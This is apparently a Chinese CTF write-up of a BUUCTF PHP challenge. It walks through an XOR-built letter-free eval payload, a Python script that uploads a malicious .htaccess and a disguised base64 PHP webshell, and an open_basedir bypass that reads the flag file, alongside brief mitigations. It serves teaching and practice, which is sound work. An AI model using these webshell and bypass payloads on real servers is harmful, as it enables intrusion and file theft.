class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = <span class="title function_ invoke__">count_chars</span>(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段PHP代码主要涉及文件上传和代码执行，通过限制某些特征来防止恶意行为。以下是详细分析：</p><ol><li><code>get_the_flag</code>函数<br>该函数负责处理文件上传，包含一系列安全检查步骤。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><code>userdir</code>的定义基于用户的IP地址（通过<code>md5</code>加密），用于创建一个唯一的上传目录。</li><li>如果该目录不存在，代码会通过<code>mkdir</code>创建此目录。这使得不同用户的上传内容被隔离。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br></pre></td></tr></table></figure><ul><li>检查是否有文件上传（<code>$_FILES[&quot;file&quot;]</code>不为空）。</li><li>获取临时文件路径（<code>tmp_name</code>）和文件名称（<code>name</code>）。</li><li>提取文件扩展名。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br></pre></td></tr></table></figure><ul><li>使用正则表达式检查扩展名，禁止包含“ph”（例如<code>.php</code>），防止用户上传PHP文件执行恶意代码。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>检查文件内容是否包含PHP代码符号<code>&lt;?</code>，防止用户上传包含PHP代码的文件绕过扩展名检查。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br></pre></td></tr></table></figure><ul><li>使用<code>exif_imagetype</code>验证文件是否为有效的图片。该函数会读取文件的Exif信息，以确定文件类型是否为常见图片格式（如JPEG、PNG等），有效地限制上传文件的类型。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">    @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果通过了所有验证，将文件移动到用户目录下的指定路径中，并输出路径。</li></ul><ol start="2"><li>文件内容展示及限制<br>以下代码负责限制传递到<code>$_GET[&#39;_&#39;]</code>参数的内容及字符类型，并通过<code>eval</code>执行传入的代码。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果<code>$_GET[&#39;_&#39;]</code>为空，则会显示当前文件源代码内容（方便调试和安全分析）。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>限制<code>$hhh</code>的长度不能超过18个字符，否则终止执行。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>使用正则表达式匹配<code>$hhh</code>中的字符，不允许<code>$hhh</code>包含数字、字母和部分常见符号，以防止常规代码注入攻击。这一正则表达式限制极为严格，使得代码内容需要使用特殊字符来绕过检测。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$character_type</span> = <span class="title function_ invoke__">count_chars</span>(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>计算<code>$hhh</code>中字符种类的数量，若超过12种字符，则拒绝执行，进一步限制了传递代码的复杂性。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br></pre></td></tr></table></figure><ul><li>执行传入的代码。这是一个潜在的安全风险点，但由于前面的多层验证，执行的代码受到诸多限制。</li></ul><p><a href="https://fanygit.github.io/">https://fanygit.github.io/</a><br>在ctf中，我们一般遇到上面这种正则，不能传入字母和数字，是不是就不能执行webshell了呢，并不是，p神在他的博客中记录了三种方法，分别是异或、取反、自增。<br>如果我们要构造 phpinfo POST GET system 这类关键字，我们可以通过 两个没有被过滤的字符进行异或得到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">构造 phpinfo </span><br><span class="line">p:%FF^%8F</span><br><span class="line">o:%FF^%90</span><br><span class="line">n:%FF^%91</span><br><span class="line">i:%FF^%96</span><br><span class="line">h:%FF^%97</span><br><span class="line">f:%FF^%99</span><br><span class="line"></span><br><span class="line">$_=%FF%FF%FF%FF%FF%FF%FF^%8F%97%8F%96%91%99%90;$_(); //$_=phpinfo;$_(); 成功执行phpinfo();</span><br><span class="line"></span><br><span class="line">在php5 可以用assert 函数 php7 不能</span><br><span class="line">php5 下</span><br><span class="line">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);// assert</span><br><span class="line">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);//_POST</span><br><span class="line">$___=$$__; //$_POST</span><br><span class="line">$_($___[_]);//assert($_POST[_])</span><br><span class="line">POST _=phpinfo();</span><br></pre></td></tr></table></figure><p>生成脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;o&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = <span class="built_in">chr</span>(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s:%s^%s&quot;</span>%(result,a,b))</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$l</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$r</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$argv</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&quot;_GET&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$argv</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">255</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>) ^ <span class="title function_ invoke__">chr</span>(<span class="number">255</span>); <span class="comment">// dechex(255) = ff</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$k</span> == <span class="variable">$argv</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$j</span> &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">                <span class="variable">$r</span> .= <span class="string">&quot;%0&quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">            <span class="variable">$r</span> .= <span class="string">&quot;%&quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&#123;<span class="subst">$l</span>`<span class="subst">$r</span>\&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>解题思路：<br>通过审计，getshell可以分为两个步骤，第一步，先绕过条件 if ( preg_match(‘&#x2F;[\x00- 0-9A-Za-z&#39;“\反引号~_&amp;.,|&#x3D;[\x7F]+&#x2F;i’, $hhh) ) ，这个条件通过 异或的方式构造无字母webshell绕过。第二步：需要绕过三个条件，分别是 if(preg_match(“&#x2F;ph&#x2F;i”,$extension))，后缀不能带有ph。if(mb_strpos(file_get_contents($tmp_name), ‘&lt;?’)!&#x3D;&#x3D;False)，文件内容中不能存在 &lt;?。if(!exif_imagetype($tmp_name)) ，文件头必须是常见图片类型文件头。绕过方式：通过上传.htaccess文件，在.htaccess文件中，需要伪造图片头来过第三个条件的检测 ，通常我们会想到GIF89a来绕过，但是这样会让.htaccess文件不能生效，这时可以通过 在.htaccess 头部添加#define width 1337 #define height 1337 绕过。然后再上传头部带有GIF89a、后缀名为jpg的一句话。</p><p>第一步：通过异或构造无字母webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// $&#123;_GET&#125;&#123;_&#125;(); </span><br><span class="line">// 通过上面给的脚本 分别用 _ G E T 来作为异或目标</span><br><span class="line">// 得到</span><br><span class="line">_:%FF^%A0</span><br><span class="line">T:%FF^%AB</span><br><span class="line">G:%FF^%B8</span><br><span class="line">E:%FF^%BA</span><br><span class="line">// 组装</span><br><span class="line">$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();</span><br><span class="line">// phpinfo 测试</span><br><span class="line">$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();&amp;%A0=phpinfo</span><br></pre></td></tr></table></figure><p>第二步：再进行.htaccess 文件内容构建的时候，需要知道文件上传的路径，路径的构建规则,<code>upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code>，得到 <code>upload/tmp_532fb014387262fa08e25fd65663cac2</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .jpg</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_532fb014387262fa08e25fd65663cac2/shell.jpg&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则</span></span><br><span class="line">shell = <span class="string">&quot;GIF89a&quot;</span>+<span class="string">&quot;aa&quot;</span>+<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;</span></span><br><span class="line"><span class="comment"># &lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://3cd358ce-4a9b-430d-b949-13b4c50642f0.node4.buuoj.cn:81/?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();&amp;%A0=get_the_flag&#x27;</span></span><br><span class="line"><span class="comment"># print(url)</span></span><br><span class="line"><span class="comment"># 上传 .htaccess </span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>, htaccess, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;upload&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;</span><br><span class="line">res = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="comment"># 上传shell</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.jpg&#x27;</span>, shell, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;upload&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;</span><br><span class="line">res = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>之后用蚁剑连接：<br><img src="/2024/10/25/WebSecurity/ctf/buuctf/image-3.png"><br>但是不能跳转到其他目录，使用蚁剑的disable_functions插件，辅助工具-&gt;绕过disable_functions-&gt;选择模式-&gt;PHP7_GC_UAF 。<br>手动绕过open_basedir payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url: http://3cd358ce-4a9b-430d-b949-13b4c50642f0.node4.buuoj.cn:81/upload/tmp_532fb014387262fa08e25fd65663cac2/shell.jpg</span><br><span class="line">POST</span><br><span class="line">cmd=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br></pre></td></tr></table></figure><p><code>open_basedir</code> 是 PHP 中的一个配置指令，用于限制 PHP 脚本只能访问指定目录及其子目录中的文件。设置 <code>open_basedir</code> 的目的是防止 PHP 脚本访问系统中不必要的文件和目录，从而加强服务器的安全性。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">open_basedir</span> = <span class="string">&quot;/var/www/html:/tmp&quot;</span></span><br></pre></td></tr></table></figure><p>这意味着所有 PHP 脚本只能访问 <code>/var/www/html</code> 和 <code>/tmp</code> 目录以及它们的子目录中的文件，试图访问其他目录会导致错误提示（通常是 “open_basedir restriction in effect”）。</p><p><strong>绕过 <code>open_basedir</code> 的常见方法</strong><br>尽管 <code>open_basedir</code> 是一个有效的安全控制手段，但在某些特定配置和漏洞情况下可能会被绕过。以下是几种常见的绕过方式：</p><ol><li><strong>符号链接（Symlink）攻击</strong>：有时可以通过符号链接将允许访问的目录链接到受限制的目录，从而间接访问被限制的目录。</li><li><strong>文件协议漏洞</strong>：利用某些扩展或函数，如 <code>curl</code> 的 <code>file://</code> 协议、<code>ZIP</code> 扩展、图片处理库等，有时可以绕过 <code>open_basedir</code> 限制。</li><li><strong>包含漏洞</strong>：某些 PHP 扩展或函数在处理文件包含时存在漏洞，可能会意外允许访问受限路径。例如，利用文件包装器（file wrappers）尝试访问特定文件。</li><li><strong>PHP 扩展的文件读写特性</strong>：某些 PHP 扩展（如 <code>FFmpeg</code>、<code>ImageMagick</code>、<code>iconv</code>）可能允许通过非直接文件操作读取受限目录内容。</li><li><strong>路径解析问题</strong>：利用一些特殊路径，如 <code>/proc/self/cwd</code> 或 <code>..</code> 等，尝试解析到受限制的目录（在某些系统上可能有效）。</li></ol><p>上面的payload含义作用如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;img&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/THis_Is_tHe_F14g&#x27;</span>));</span><br></pre></td></tr></table></figure><ol><li><strong>切换目录到可访问路径</strong>：<ul><li><code>chdir(&#39;img&#39;)</code>：将当前目录切换到 <code>img</code> 目录，这通常是一个可以访问的子目录。</li></ul></li><li>**重置 <code>open_basedir</code>**：<ul><li><code>ini_set(&#39;open_basedir&#39;, &#39;..&#39;)</code>：通过 <code>ini_set</code> 将 <code>open_basedir</code> 的范围重新定义为上一级目录（<code>..</code>），允许脚本访问当前目录的父目录。</li></ul></li><li><strong>多次切换到上级目录</strong>：<ul><li><code>chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);</code>：重复使用 <code>chdir(&#39;..&#39;)</code> 指令返回到更高的目录级别，最终到达根目录（<code>/</code>）。</li></ul></li><li><strong>重设 <code>open_basedir</code> 到根目录</strong>：<ul><li><code>ini_set(&#39;open_basedir&#39;, &#39;/&#39;)</code>：再次使用 <code>ini_set</code> 将 <code>open_basedir</code> 设置为根目录 <code>/</code>，即允许访问整个文件系统。</li></ul></li><li><strong>读取敏感文件</strong>：<ul><li><code>print_r(file_get_contents(&#39;/THis_Is_tHe_F14g&#39;));</code>：利用 <code>file_get_contents</code> 读取 <code>/THis_Is_tHe_F14g</code> 文件的内容（假设这是目标文件），并输出到响应中。</li></ul></li></ol><p>这种绕过方式利用了 PHP 的动态配置特性，如果 <code>ini_set</code> 函数可用且 <code>open_basedir</code> 不严格设置为不可更改，那么脚本有可能通过这种方式访问敏感文件。<br>为防止此类绕过，可以采取以下措施：</p><ul><li><strong>禁用 <code>ini_set</code> 函数</strong>：防止运行时更改 <code>open_basedir</code> 配置。</li><li>**严格设置 <code>open_basedir</code>**：在服务器配置中强制设置 <code>open_basedir</code>，避免脚本通过代码更改配置。</li><li><strong>使用容器化隔离</strong>：在严格隔离的环境中运行服务，防止突破限制后直接访问主机系统中的敏感文件。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>用无字母webshell的方式绕过正则对字母数字的匹配，通过上传.htaccess的方式绕过对正则对后缀的匹配，.htaccess为什么上传这个文件就能让上传的图片当做php文件执行呢？<br><img src="/2024/10/25/WebSecurity/ctf/buuctf/image-4.png"><br>实际上就是apache的一个配置文件，也就是只有服务器是apache的时候可以这样做，nginx就不行。而 AddType 这个参数可以为当前目录下的 指定的后缀名添加MIME类型。<br>刚刚我们设置的 AddType application&#x2F;x-httpd-php .jpg 就是把.jpg后缀的MIME类型设置为 application&#x2F;x-httpd-php，服务器去读取.jpg文件的时候会把它当成php文件读取，所以，里面的一句话就能执行。</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
